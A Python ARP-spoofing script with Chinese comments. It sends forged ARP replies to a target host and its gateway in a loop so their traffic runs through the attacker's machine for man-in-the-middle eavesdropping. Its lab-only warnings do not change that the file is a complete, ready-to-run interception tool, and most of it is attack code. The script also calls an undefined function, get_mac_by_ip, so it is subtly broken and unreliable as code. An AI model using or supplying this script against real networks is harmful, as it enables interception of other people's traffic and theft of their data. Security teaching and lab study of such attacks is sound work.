#!/usr/bin/env python3
"""
ARP 欺骗（中间人攻击）演示脚本
============================================
⚠️  仅限在隔离虚拟实验环境中使用！
⚠️  严禁在未授权的真实网络中使用！
============================================

原理：向目标和网关发送伪造的 ARP Reply
      使流量经过攻击者机器，实现中间人窃听

用法:
  python arp_spoof.py --target 192.168.1.10 --gateway 192.168.1.1
  python arp_spoof.py --target 192.168.1.10 --gateway 192.168.1.1 --iface eth0
"""
import argparse
import sys
import time

try:
    from scapy.all import ARP, send, getmacbyip, conf
except ImportError:
    print("[!] 需要安装 scapy: pip install scapy")
    sys.exit(1)

conf.verb = 0


def get_mac_safe(ip: str) -> str:
    """安全获取 MAC 地址"""
    mac = getmacbyip(ip)
    if not mac:
        print(f"[!] 无法获取 {ip} 的 MAC 地址")
        print("[!] 请检查目标是否在线，以及网络连通性")
        sys.exit(1)
    return mac


def spoof_arp(target_ip: str, gateway_ip: str, interface: str = "eth0"):
    """
    执行 ARP 欺骗攻击
    Args:
        target_ip: 被欺骗的目标 IP
        gateway_ip: 网关 IP
        interface: 网卡接口名
    """
    target_mac = get_mac_safe(target_ip)
    gateway_mac = get_mac_by_ip(gateway_ip)

    print(f"""
╔══════════════════════════════════════╗
║       ARP 欺骗攻击演示             ║
║  ⚠️  仅限实验环境使用！            ║
╚══════════════════════════════════════╝
""")

    print(f"[*] 目标: {target_ip} ({target_mac})")
    print(f"[*] 网关: {gateway_ip} ({gateway_mac})")
    print(f"[*] 接口: {interface}")
    print(f"[*] 按 Ctrl+C 停止攻击\n")

    sent_count = 0
    try:
        while True:
            # 告诉目标: 我是网关（伪造网关 MAC 为攻击者 MAC）
            send(ARP(
                op=2,                    # ARP Reply
                pdst=target_ip,          # 目标 IP
                hwdst=target_mac,        # 目标真实 MAC
                psrc=gateway_ip,         # 伪造为网关 IP
            ), iface=interface)

            # 告诉网关: 我是目标（伪造目标 MAC 为攻击者 MAC）
            send(ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=target_ip,
            ), iface=interface)

            sent_count += 2
            print(f"\r  [+] 已发送 {sent_count} 个 ARP Reply", end="", flush=True)
            time.sleep(2)  # 每 2 秒刷新一次

    except KeyboardInterrupt:
        print(f"\n\n[*] 攻击已停止")
        print(f"[*] 共发送 {sent_count} 个 ARP Reply")
        print(f"[*] 提示: 目标的 ARP 表将在几分钟后自动恢复")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="ARP 欺骗演示（仅限实验环境）"
    )
    parser.add_argument("--target", "-t", required=True, help="目标 IP")
    parser.add_argument("--gateway", "-g", required=True, help="网关 IP")
    parser.add_argument("--iface", "-i", default="eth0", help="网卡接口 (默认 eth0)")
    args = parser.parse_args()

    spoof_arp(args.target, args.gateway, args.iface)
